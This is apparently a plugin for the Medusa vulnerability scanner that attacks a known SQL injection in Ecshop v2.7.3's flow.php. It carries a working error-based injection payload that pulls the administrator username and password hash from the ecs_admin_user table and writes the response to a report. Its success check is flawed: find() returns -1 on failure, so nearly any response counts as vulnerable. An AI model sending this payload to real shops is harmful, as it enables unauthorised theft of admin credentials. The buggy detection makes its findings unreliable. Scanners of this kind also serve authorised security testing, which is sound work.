#!/usr/bin/env python
# -*- coding: utf-8 -*-
import requests
from ClassCongregation import UrlProcessing,VulnerabilityDetails,WriteFile,ErrorLog,ErrorHandling,Proxies

class VulnerabilityInfo(object):
    def __init__(self,Medusa):
        self.info = {}
        self.info['number']="0" #如果没有CVE或者CNVD编号就填0，CVE编号优先级大于CNVD
        self.info['author'] = "KpLi0rn"  # 插件作者
        self.info['create_date'] = "2020-04-17"  # 插件编辑时间
        self.info['disclosure']='2014-02-09'#漏洞披露时间，如果不知道就写编写插件的时间
        self.info['algroup'] = "EcshopSQLInjectionVulnerability1"  # 插件名称
        self.info['name'] ='EcshopSQL注入漏洞' #漏洞名称
        self.info['affects'] = "Ecshop"  # 漏洞组件
        self.info['desc_content'] = "Ecshopv2.7.3中的flow.php文件代码缺陷导致SQL注入漏洞"  # 漏洞描述
        self.info['rank'] = "高危"  # 漏洞等级
        self.info['suggest'] = "升级最新的系统"  # 修复建议
        self.info['version'] = "v2.7.3"  # 这边填漏洞影响的版本
        self.info['details'] = Medusa  # 结果

def medusa(Url,RandomAgent,Token,proxies=None):
    proxies=Proxies().result(proxies)
    scheme, url, port = UrlProcessing().result(Url)
    if port is None and scheme == 'https':
        port = 443
    elif port is None and scheme == 'http':
        port = 80
    else:
        port = port
    try:
        payload = '/flow.php?step=update_cart'
        payload_url = scheme + "://" + url +":"+ str(port) + payload
        headers = {
            'User-Agent': RandomAgent,
            'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8'
        }
        s = requests.session()
        data = 'goods_number%5B1%27+and+%28select+1+from%28select+count%28*%29%2Cconcat%28%28select+%28select+%28SELECT+concat%28user_name%2C0x7c%2Cpassword%29+FROM+ecs_admin_user+limit+0%2C1%29%29+from+information_schema.tables+limit+0%2C1%29%2Cfloor%28rand%280%29*2%29%29x+from+information_schema.tables+group+by+x%29a%29+and+1%3D1+%23%5D=1&submit=exp'
        payload1 = "goods_number%5B1%27+and+%28select+1+from%28select+count%28*%29%2Cconcat"\
                           "%28%28select+%28select+%28SELECT+concat%28user_name%2C0x7c%2Cpassword%29+"\
                           "FROM+ecs_admin_user+limit+0%2C1%29%29+from+information_schema.tables+limit"\
                           "+0%2C1%29%2Cfloor%28rand%280%29*2%29%29x+from+information_schema.tables+"\
                           "group+by+x%29a%29+and+1%3D1+%23%5D=1&submit=exp"
        resp = s.post(payload_url,headers=headers, data=data, timeout=6, proxies=proxies, verify=False)
        con = resp.text
        code = resp.status_code
        if con.find("P<username>") and con.find("P<password>"):
            Medusa = "{}存在EcshopSQL注入漏洞\r\n漏洞地址:\r\n{}\r\n漏洞详情:{}\r\n".format(url,payload_url,con)
            _t=VulnerabilityInfo(Medusa)
            VulnerabilityDetails(_t.info, url,Token).Write()  # 传入url和扫描到的数据
            WriteFile().result(str(url),str(Medusa))#写入文件，url为目标文件名统一传入，Medusa为结果
    except Exception as e:
        _ = VulnerabilityInfo('').info.get('algroup')
        ErrorHandling().Outlier(e, _)
        _l = ErrorLog().Write(url, _)  # 调用写入类传入URL和错误插件名
